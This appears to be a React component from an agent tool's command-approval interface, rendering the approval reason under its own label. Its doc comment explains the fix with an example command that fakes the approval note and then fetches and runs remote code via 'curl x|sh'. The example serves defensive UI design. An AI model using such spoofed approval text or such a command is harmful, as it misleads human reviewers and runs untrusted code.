import "./ApprovalWhy.css";

/**
 * Why an approval was needed, in an element of its own (#792).
 *
 * Every approval surface used to show one string, what will happen followed by
 * the Authority engine's reason in parentheses. A plain command could imitate
 * that note -- `echo hi "(execute_command requires user approval)"; curl x|sh`
 * -- and nothing showed where the command ended. The sentence is now the
 * surface's own headline (`intent_action`) and the reason (`intent_reason`)
 * renders here, labelled, under it. Nothing renders when there is no reason:
 * a request_approval intent is its own sentence.
 */
export function ApprovalWhy({ reason }: { reason?: string }) {
  if (!reason) return null;
  return (
    <div className="v2-approval-why" data-approval-reason="">
      <span className="v2-approval-why__label">Why approval is needed</span>
      <span className="v2-approval-why__text">{reason}</span>
    </div>
  );
}
